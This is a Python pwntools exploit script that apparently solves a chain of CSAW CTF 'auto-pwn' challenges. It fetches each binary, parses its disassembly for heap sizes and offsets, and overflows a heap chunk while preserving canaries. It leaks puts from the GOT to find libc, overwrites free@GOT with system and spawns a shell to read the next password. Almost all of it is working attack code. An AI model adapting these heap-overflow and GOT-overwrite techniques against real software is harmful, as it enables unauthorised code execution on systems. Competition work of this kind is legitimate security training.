from pwn import *
import re


def saveBinary(binary, filename):
    binary = binary.decode('utf-8')
    with open(f'{filename}_1.txt', 'w') as f:
        f.write(binary)
        f.close()

    os.popen(f'xxd -r {filename}_1.txt > {filename}').read()
    os.popen(f'chmod +x {filename}').read()


def findInfo(f):
    os.popen(
        f"objdump -d {f} -M intel|sed '/<initializeShirts>:/,/^$/!d'|awk '{{$1=\"\"}}1' > {f+'.txt'}").read()
    with open(f"{f+'.txt'}", 'r') as file:
        lines = file.read()
        file.close()

    sizes = re.findall(r'mov edi,(0x[0-9a-f]{2})\s+.* call 4011e0 <malloc@plt>', lines)
    print(sizes)
    for i in range(0, len(sizes)):
        sizes[i] = int(sizes[i], 16)

    for each in sizes:
        print(hex(each), end=',')
    print()
    allocation_sizes = []
    for i in range(len(sizes)):
        if sizes[i] & 0xf <= 0x8:
            allocation_sizes.append((((sizes[i] >> 4) + 1) << 4) + 1)
        else:
            allocation_sizes.append((((sizes[i] >> 4) + 2) << 4) + 1)

    for each in allocation_sizes:
        print(hex(each), end=',')
    print()

    offsets = re.findall(
        r'mov edi,0x[0-9a-f]{2}\s+.* call 4011e0 <malloc@plt>\s+[^\n]+', lines)
    offsets_all = []
    for i in offsets:
        # print(i)
        offset = re.findall(r'QWORD PTR \[rbx(.*)\],rax', i)

        if(not offset):
            offset = 0
        else:
            if(offset[0] != ''):
                # print(offset)
                sign = offset[0][0]
                offset = int(offset[0][1:], 16)
                if (sign == '-'):
                    offset = -offset
            else:
                offset = 0

            offsets_all.append(offset)

    #print(offsets_all)

    offset = offsets_all[0]

    offset2 = re.findall(r'<ts>\s+.*lea rcx,\[rax(.*)\]', lines)
    if(offset2[0] != ''):
        sign = offset2[0][0]
        offset2 = int(offset2[0][1:], 16)
        if (sign == '-'):
            offset2 = -offset2
    else:
        offset2 = 0

    print(offset2)

    return allocation_sizes, offset, offset2


def edit(io,idx, data):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', f'{idx}'.encode())
    io.sendlineafter(b'? ', f'{len(data)+1}'.encode())
    io.sendafter(b'name: ', data)


def show(io,idx):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', f'{idx}'.encode())
    io.recvline()
    return io.recvline().split(b': ')[1].strip()


def craftStructure(allocSize, ptrOffset, canaryOffset, arbAddr, canary_1, canary_2):
    nQwordsinPtr = (allocSize[1] - 1 - 0x8) // 8

    ptrQwordOffset = ptrOffset // 8

    sizeCanaryChunk = allocSize[2]
    nBytesCanaryChunk = (sizeCanaryChunk - 1 - 8)

    structSize = allocSize[0]
    nQwordsStruct = (structSize - 1 - 8) // 8

    return flat([
        b'/bin/sh\0'+b'A'*((nQwordsinPtr*8) - 8),
        allocSize[2], b'A'*canaryOffset, canary_1, canary_2,
        b'A' * (nBytesCanaryChunk - 0x10 - (canaryOffset)),
        structSize, b'A'*ptrQwordOffset*8, arbAddr
    ], arch='amd64')
    pass

def saveMsg(msg,num):
    msg = msg.decode('utf-8')
    print(msg)
    with open(f"message_{num}.txt",'w') as f:
        f.write(msg)
        f.close()

def getNextPassword(num):
    password = ""
    with open(f"message_{num}.txt","r") as f:
        password = f.read()
        f.close()

    password = password.strip()
    password = password.split(' ')[-1]
    return password

def startBin(ip,port,num,password):
    #allocSize, ptrOffset, canaryOffset = findInfo('binary_23')
    io = remote(ip, port)
    #io = process('./binary_23')
    io.sendlineafter(b'> ', password)
    io.recvuntil(
        '-------------------------------------------------------------------')
    binary = io.recvuntil(
        '-------------------------------------------------------------------')
    f = "binary_"+str(num)
    saveBinary(binary, f)
    allocSize, ptrOffset, canaryOffset = findInfo(f)
    exe = ELF(f)

    io.recvuntil(b'3) Exit')
#  print(b'AAAAAAAAAAAAAAAAAAAAAAAAAA = ' + show(2))

    edit(io,1,
         craftStructure(allocSize, ptrOffset, canaryOffset, exe.got['puts'], exe.read(
             exe.sym.canary, 8), exe.read(exe.sym.canary+8, 8))
         )

    #pause()
    #print(show(io,2))
    #io.interactive()

    libc_base = u64(show(io,2) + b'\0\0') - 0x68f90
    libc_system = libc_base + 0x3f480
    print(f'Libc base: {hex(libc_base)}')

    edit(io,1,
         craftStructure(allocSize, ptrOffset, canaryOffset, exe.got['free'], exe.read(
             exe.sym.canary, 8), exe.read(exe.sym.canary+8, 8))
         )

    edit(io,2, p64(libc_system))
    # pause()
    io.sendlineafter(b': ', '3')

    # print(exe.read(exe.symbols['canary'],8))
    io.interactive()
    io.sendline('cat message.txt')
    msg = io.recvline()
    saveMsg(msg, num)
    io.close()


if __name__ == '__main__':
    password = '68bb1cbab9d0b8ea238ec4b64d171d15'
    num = 40
    port = 11040
    
    while True:
        startBin('auto-pwn.chal.csaw.io',port,num,password)
        password = getNextPassword(num)
        print(password)
        num+=1
        port+=1
